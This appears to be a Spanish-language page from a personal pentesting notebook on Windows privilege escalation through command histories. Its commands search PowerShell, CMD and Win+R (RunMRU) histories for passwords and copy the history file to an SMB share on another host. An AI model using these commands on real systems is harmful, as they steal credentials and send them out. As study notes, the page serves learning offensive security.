@@ -1,0 +1,94 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Historiales | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="historiales">
+          <div class="note-tabbar">
+            <span>Historiales</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Credenciales</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / credenciales</p>
+            <h2>Historiales</h2>
+
+            <h2>Historial PowerShell</h2>
+
+            <section class="code-card">
+              <h3>Historial</h3>
+              <pre><code># Windows
+# cd /Users/&lt;username&gt;/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/
+cd /Users/administrator/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/
+# Kali
+impacket-smbserver smb $(pwd) -smb2support -debug
+# Windows
+copy ConsoleHost_history.txt \\192.168.45.220\smb\</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>PowerShell: Buscar credenciales dentro del historial de powershell.</h3>
+              <pre><code># Fichero de historial de PowerShell
+cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+type C:/Users/&lt;username&gt;/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
+# Buscar dentro del historial por palabras claves
+cat (Get-PSReadlineOption).HistorySavePath | Select-String &lt;passw&gt;</code></pre>
+            </section>
+
+            <h2>Historial Consola</h2>
+
+            <section class="code-card">
+              <h3>PowerShell: Buscar credenciales dentro del historial de CMD.</h3>
+              <pre><code># Fichero de historial cmd
+cat $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+# Buscar dentro de fichero com comd
+cat $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt | Select-String &lt;passw&gt;</code></pre>
+            </section>
+
+            <h2>Comandos Recientes (Win+R)</h2>
+
+            <section class="code-card">
+              <h3>PowerShell: Buscar credenciales dentro del historial de Win+R.</h3>
+              <pre><code>foreach ($p in $property) {Write-Host &quot;$((Get-Item &quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU&quot;-ErrorAction SilentlyContinue).getValue($p))&quot;}</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>credenciales</span>
+              <span>historiales</span>
+              <span>historial</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
